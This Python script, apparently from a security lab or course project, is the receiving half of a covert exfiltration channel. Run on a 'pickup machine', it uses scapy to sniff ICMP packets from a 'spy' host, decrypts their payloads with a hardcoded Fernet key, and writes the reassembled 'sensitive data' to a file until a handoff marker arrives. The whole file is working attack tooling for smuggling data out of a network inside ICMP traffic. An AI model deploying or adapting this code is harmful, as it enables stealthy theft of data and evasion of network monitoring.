# Execute on pickup machine
# python3 pickupBriefcase-encrypted.py sensitiveData.txt 10.0.2.16

import sys
from scapy.all import *
from Encryption import *

decryptionKey = b'fnKksPKHBtvntWwgxL8U7x1kMptOkZHe1IG52RXXhgE='

#conf.verb mutes scapys verbosity
conf.verb = 0

# Get arguments passed at command line
f = open(sys.argv[1],"w")
host = sys.argv[2]

# Filter ICMP packets from spy
filter = "icmp and host " + host
print("sniffing with filter (%s) for secret message bytes" % (filter))

# While loop to keep sniffing until transmission is complete
keepGoing = True
while keepGoing:
    # Sniff each packet as it comes in
    packets = sniff(1,filter=filter)

    for p in packets:

        #Convert incoming byte data to string and decode utf-8
        message = p['Raw'].load

        fernet = Fernet(decryptionKey)
        decryptedMessage = fernet.decrypt(message)
        decryptedMessage = decryptedMessage.decode('utf-8')  
        printObject(decryptedMessage,"Decrypting message") 

        #Stop sniffing packets once hidden message is found
        if 'Handoff' in str(decryptedMessage):
            f.write(str(decryptedMessage))
            f.close()
            print("Secret Message transmission complete!")
            keepGoing = False
        else:
            # Continue to write data to text file as it comes in
            f.write(str(decryptedMessage))
            print("Data Received")